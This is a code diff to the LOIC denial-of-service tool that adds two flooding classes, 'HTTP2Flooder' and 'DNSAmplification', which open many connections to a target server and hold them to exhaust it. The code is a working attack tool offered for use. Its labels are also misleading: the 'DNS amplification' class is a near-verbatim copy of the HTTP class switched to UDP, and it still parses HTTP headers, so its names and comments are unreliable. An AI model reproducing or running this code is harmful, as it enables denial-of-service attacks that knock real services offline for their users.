@@ -18,6 +18,7 @@ using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 
 namespace LOIC
 {
@@ -634,4 +635,492 @@ namespace LOIC
             }
         }
     }
+
+	/// <summary>
+	/// HTTP/2 Flooder class
+	/// </summary>
+	public class HTTP2Flooder : cHLDos
+	{
+		private string _dns;
+		private string _ip;
+		private int _port;
+		private string _subSite;
+		private bool _random;
+		private bool _usegZip;
+		private bool _resp;
+
+		private int _nSockets;
+		private List<Socket> _lSockets = new List<Socket>();
+		private BackgroundWorker bw;
+
+		/// <summary>
+		/// Creates the HTTP2Flooder object.
+		/// </summary>
+		/// <param name="dns">DNS string of the target</param>
+		/// <param name="ip">IP string of a specific server. Use this ONLY if the target does load balancing between different IPs and you want to target a specific IP. Normally you want to provide an empty string!</param>
+		/// <param name="port">The port number. This class only understands HTTP/2.</param>
+		/// <param name="subsite">The path to the targeted site/document.</param>
+		/// <param name="delay">Time in milliseconds between the creation of new sockets.</param>
+		/// <param name="timeout">Time in seconds between requests on the same connection. The higher the better, but should be UNDER the timeout from the server. (30 seemed to be working always so far!)</param>
+		/// <param name="random">Adds a random string to the subsite so that every new connection requests a new file. (Use on search sites or to bypass the cache/proxy)</param>
+		/// <param name="nSockets">The amount of sockets for this object</param>
+		/// <param name="usegZip">Turns on the gzip/deflate header to check for: CVE-2009-1891 - keep in mind, that the compressed file still has to be larger than ~24KB! (Maybe use on large static files like pdf etc?)</param>
+		public HTTP2Flooder(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, bool resp, int nSockets, bool usegZip)
+		{
+			this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
+			this._ip = ip;
+			this._port = port;
+			this._subSite = subSite;
+			this._nSockets = nSockets;
+			if (timeout <= 0)
+			{
+				this.Timeout = 30000; // 30 seconds
+			}
+			else
+			{
+				this.Timeout = timeout * 1000;
+			}
+			this.Delay = delay + 1;
+			this._random = random;
+			this._usegZip = usegZip;
+			this._resp = resp;
+			this.IsDelayed = true;
+			Requested = 0; // we reset this! - meaning of this counter changes in this context!
+		}
+		public override void Start()
+		{
+			this.IsFlooding = true;
+			this.bw = new BackgroundWorker();
+			this.bw.DoWork += bw_DoWork;
+			this.bw.RunWorkerAsync();
+			this.bw.WorkerSupportsCancellation = true;
+		}
+		public override void Stop()
+		{
+			this.IsFlooding = false;
+			this.bw.CancelAsync();
+		}
+		private void bw_DoWork(object sender, DoWorkEventArgs e)
+		{
+			try
+			{
+				int bsize = 16;
+				int mincl = 16384; // set minimal content-length to 16KB
+				byte[] rbuf = new byte[bsize];
+				string redirect = "";
+				DateTime stop = DateTime.UtcNow;
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
+
+				State = ReqState.Ready;
+				while (this.IsFlooding)
+				{
+					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
+					State = ReqState.Connecting; // SET STATE TO CONNECTING //
+
+					// forget about slow! .. we have enough safeguards in place!
+					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
+					{
+						Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+						socket.ReceiveTimeout = Timeout;
+						socket.ReceiveBufferSize = bsize;
+						try
+						{
+							socket.Connect(RHost);
+							socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
+							byte[] sbuf = Functions.RandomHttp2Header("GET", _subSite, _dns, _random, _usegZip, 300);
+							socket.Send(sbuf);
+						}
+						catch { }
+
+						if (socket.Connected)
+						{
+							bool keeps = !_resp;
+							if (_resp)
+							{
+								do
+								{ // some damn fail checks (and resolving dynamic redirects -.-)
+									if (redirect != "")
+									{
+										if (!socket.Connected)
+										{
+											socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
+											socket.ReceiveTimeout = Timeout;
+											socket.ReceiveBufferSize = bsize;
+											socket.Connect(RHost);
+										}
+										byte[] sbuf = Functions.RandomHttp2Header("GET", redirect, _dns, false, _usegZip, 300);
+										socket.Send(sbuf);
+										redirect = "";
+									}
+									keeps = false;
+									try
+									{
+										string header = "";
+										while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
+										{
+											header += Encoding.ASCII.GetString(rbuf);
+										}
+										string[] sp = header.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
+										for (int i = (sp.Length - 1); this.IsFlooding && i >= 0; i--)
+										{
+											string[] tsp = sp[i].Split(new char[] { ':' }, 2, StringSplitOptions.RemoveEmptyEntries);
+
+											if (tsp.Length != 2)
+												continue;
+
+											tsp[0] = tsp[0].Trim();
+											tsp[1] = tsp[1].Trim();
+
+											if (tsp[0] == "Location")
+											{ // parse and follow the redirect
+												redirect = tsp[1];
+												if (!redirect.StartsWith("/"))
+												{
+													try { redirect = new Uri(redirect).PathAndQuery; }
+													catch { redirect = ""; }
+												}
+												break;
+											}
+											else if (tsp[0] == "Content-Length")
+											{ // checking if the content-length is long enough to work with this!
+												int sl = 0;
+												if (int.TryParse(tsp[1], out sl) && sl >= mincl)
+												{
+													keeps = true;
+													break;
+												}
+											}
+											else if (tsp[0] == "Transfer-Encoding" && tsp[1].ToLowerInvariant() == "chunked")
+											{ //well, what doo?
+												keeps = true;
+												break;
+											}
+										}
+									}
+									catch
+									{ }
+								} while (redirect != "" && DateTime.UtcNow < stop);
+
+								if (!keeps)
+									Failed++;
+							}
+							if (keeps)
+							{
+								socket.Blocking = true; // we rely on this in the dl-loop!
+								_lSockets.Insert(0, socket);
+								Requested++;
+							}
+						}
+						if (_lSockets.Count >= _nSockets)
+						{
+							this.IsDelayed = false;
+						}
+						else if (Delay > 0)
+						{
+							System.Threading.Thread.Sleep(Delay);
+						}
+					}
+
+					State = ReqState.Downloading;
+					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
+					{ // keep the sockets alive
+						try
+						{
+							// here's the downfall: if the server at one point decides to just discard the socket
+							// and not close / reset the connection we are stuck with a half-closed connection
+							// testing for it doesn't work, because the server than resets the connection in order
+							// to respond to the new request ... so we have to rely on the connection timeout!
+							if (!_lSockets[i].Connected || (_lSockets[i].Receive(rbuf) < bsize))
+							{
+								_lSockets.RemoveAt(i);
+								Failed++;
+								Requested--; // the "requested" number in the stats shows the actual open sockets
+							}
+							else
+							{
+								Downloaded++;
+							}
+						}
+						catch
+						{
+							_lSockets.RemoveAt(i);
+							Failed++;
+							Requested--;
+						}
+					}
+
+					State = ReqState.Completed;
+					this.IsDelayed = (_lSockets.Count < _nSockets);
+					if (!this.IsDelayed)
+					{
+						System.Threading.Thread.Sleep(Timeout);
+					}
+				}
+			}
+			catch
+			{
+				State = ReqState.Failed;
+			}
+			finally
+			{
+				this.IsFlooding = false;
+				// not so sure about the graceful shutdown ... but why not?
+				for (int i = (_lSockets.Count - 1); i >= 0; i--)
+				{
+					try
+					{
+						_lSockets[i].Close();
+					}
+					catch { }
+				}
+				_lSockets.Clear();
+				State = ReqState.Ready;
+				this.IsDelayed = true;
+			}
+		}
+	} // class HTTP2Flooder
+
+	/// <summary>
+	/// DNS Amplification class
+	/// </summary>
+	public class DNSAmplification : cHLDos
+	{
+		private string _dns;
+		private string _ip;
+		private int _port;
+		private string _subSite;
+		private bool _random;
+		private bool _usegZip;
+		private bool _resp;
+
+		private int _nSockets;
+		private List<Socket> _lSockets = new List<Socket>();
+		private BackgroundWorker bw;
+
+		/// <summary>
+		/// Creates the DNSAmplification object.
+		/// </summary>
+		/// <param name="dns">DNS string of the target</param>
+		/// <param name="ip">IP string of a specific server. Use this ONLY if the target does load balancing between different IPs and you want to target a specific IP. Normally you want to provide an empty string!</param>
+		/// <param name="port">The port number. This class only understands DNS.</param>
+		/// <param name="subsite">The path to the targeted site/document.</param>
+		/// <param name="delay">Time in milliseconds between the creation of new sockets.</param>
+		/// <param name="timeout">Time in seconds between requests on the same connection. The higher the better, but should be UNDER the timeout from the server. (30 seemed to be working always so far!)</param>
+		/// <param name="random">Adds a random string to the subsite so that every new connection requests a new file. (Use on search sites or to bypass the cache/proxy)</param>
+		/// <param name="nSockets">The amount of sockets for this object</param>
+		/// <param name="usegZip">Turns on the gzip/deflate header to check for: CVE-2009-1891 - keep in mind, that the compressed file still has to be larger than ~24KB! (Maybe use on large static files like pdf etc?)</param>
+		public DNSAmplification(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, bool resp, int nSockets, bool usegZip)
+		{
+			this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
+			this._ip = ip;
+			this._port = port;
+			this._subSite = subSite;
+			this._nSockets = nSockets;
+			if (timeout <= 0)
+			{
+				this.Timeout = 30000; // 30 seconds
+			}
+			else
+			{
+				this.Timeout = timeout * 1000;
+			}
+			this.Delay = delay + 1;
+			this._random = random;
+			this._usegZip = usegZip;
+			this._resp = resp;
+			this.IsDelayed = true;
+			Requested = 0; // we reset this! - meaning of this counter changes in this context!
+		}
+		public override void Start()
+		{
+			this.IsFlooding = true;
+			this.bw = new BackgroundWorker();
+			this.bw.DoWork += bw_DoWork;
+			this.bw.RunWorkerAsync();
+			this.bw.WorkerSupportsCancellation = true;
+		}
+		public override void Stop()
+		{
+			this.IsFlooding = false;
+			this.bw.CancelAsync();
+		}
+		private void bw_DoWork(object sender, DoWorkEventArgs e)
+		{
+			try
+			{
+				int bsize = 16;
+				int mincl = 16384; // set minimal content-length to 16KB
+				byte[] rbuf = new byte[bsize];
+				string redirect = "";
+				DateTime stop = DateTime.UtcNow;
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(_ip), _port);
+
+				State = ReqState.Ready;
+				while (this.IsFlooding)
+				{
+					stop = DateTime.UtcNow.AddMilliseconds(Timeout);
+					State = ReqState.Connecting; // SET STATE TO CONNECTING //
+
+					// forget about slow! .. we have enough safeguards in place!
+					while (this.IsFlooding && this.IsDelayed && DateTime.UtcNow < stop)
+					{
+						Socket socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
+						socket.ReceiveTimeout = Timeout;
+						socket.ReceiveBufferSize = bsize;
+						try
+						{
+							socket.Connect(RHost);
+							socket.Blocking = _resp; // beware of shitstorm of 10035 - 10037 errors o.O
+							byte[] sbuf = Functions.RandomDnsQuery(_subSite, _dns, _random, _usegZip, 300);
+							socket.Send(sbuf);
+						}
+						catch { }
+
+						if (socket.Connected)
+						{
+							bool keeps = !_resp;
+							if (_resp)
+							{
+								do
+								{ // some damn fail checks (and resolving dynamic redirects -.-)
+									if (redirect != "")
+									{
+										if (!socket.Connected)
+										{
+											socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
+											socket.ReceiveTimeout = Timeout;
+											socket.ReceiveBufferSize = bsize;
+											socket.Connect(RHost);
+										}
+										byte[] sbuf = Functions.RandomDnsQuery(redirect, _dns, false, _usegZip, 300);
+										socket.Send(sbuf);
+										redirect = "";
+									}
+									keeps = false;
+									try
+									{
+										string header = "";
+										while (!header.Contains(Environment.NewLine + Environment.NewLine) && (socket.Receive(rbuf) >= bsize))
+										{
+											header += Encoding.ASCII.GetString(rbuf);
+										}
+										string[] sp = header.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
+										for (int i = (sp.Length - 1); this.IsFlooding && i >= 0; i--)
+										{
+											string[] tsp = sp[i].Split(new char[] { ':' }, 2, StringSplitOptions.RemoveEmptyEntries);
+
+											if (tsp.Length != 2)
+												continue;
+
+											tsp[0] = tsp[0].Trim();
+											tsp[1] = tsp[1].Trim();
+
+											if (tsp[0] == "Location")
+											{ // parse and follow the redirect
+												redirect = tsp[1];
+												if (!redirect.StartsWith("/"))
+												{
+													try { redirect = new Uri(redirect).PathAndQuery; }
+													catch { redirect = ""; }
+												}
+												break;
+											}
+											else if (tsp[0] == "Content-Length")
+											{ // checking if the content-length is long enough to work with this!
+												int sl = 0;
+												if (int.TryParse(tsp[1], out sl) && sl >= mincl)
+												{
+													keeps = true;
+													break;
+												}
+											}
+											else if (tsp[0] == "Transfer-Encoding" && tsp[1].ToLowerInvariant() == "chunked")
+											{ //well, what doo?
+												keeps = true;
+												break;
+											}
+										}
+									}
+									catch
+									{ }
+								} while (redirect != "" && DateTime.UtcNow < stop);
+
+								if (!keeps)
+									Failed++;
+							}
+							if (keeps)
+							{
+								socket.Blocking = true; // we rely on this in the dl-loop!
+								_lSockets.Insert(0, socket);
+								Requested++;
+							}
+						}
+						if (_lSockets.Count >= _nSockets)
+						{
+							this.IsDelayed = false;
+						}
+						else if (Delay > 0)
+						{
+							System.Threading.Thread.Sleep(Delay);
+						}
+					}
+
+					State = ReqState.Downloading;
+					for (int i = (_lSockets.Count - 1); this.IsFlooding && i >= 0; i--)
+					{ // keep the sockets alive
+						try
+						{
+							// here's the downfall: if the server at one point decides to just discard the socket
+							// and not close / reset the connection we are stuck with a half-closed connection
+							// testing for it doesn't work, because the server than resets the connection in order
+							// to respond to the new request ... so we have to rely on the connection timeout!
+							if (!_lSockets[i].Connected || (_lSockets[i].Receive(rbuf) < bsize))
+							{
+								_lSockets.RemoveAt(i);
+								Failed++;
+								Requested--; // the "requested" number in the stats shows the actual open sockets
+							}
+							else
+							{
+								Downloaded++;
+							}
+						}
+						catch
+						{
+							_lSockets.RemoveAt(i);
+							Failed++;
+							Requested--;
+						}
+					}
+
+					State = ReqState.Completed;
+					this.IsDelayed = (_lSockets.Count < _nSockets);
+					if (!this.IsDelayed)
+					{
+						System.Threading.Thread.Sleep(Timeout);
+					}
+				}
+			}
+			catch
+			{
+				State = ReqState.Failed;
+			}
+			finally
+			{
+				this.IsFlooding = false;
+				// not so sure about the graceful shutdown ... but why not?
+				for (int i = (_lSockets.Count - 1); i >= 0; i--)
+				{
+					try
+					{
+						_lSockets[i].Close();
+					}
+					catch { }
+				}
+				_lSockets.Clear();
+				State = ReqState.Ready;
+				this.IsDelayed = true;
+			}
+		}
+	} // class DNSAmplification
 }
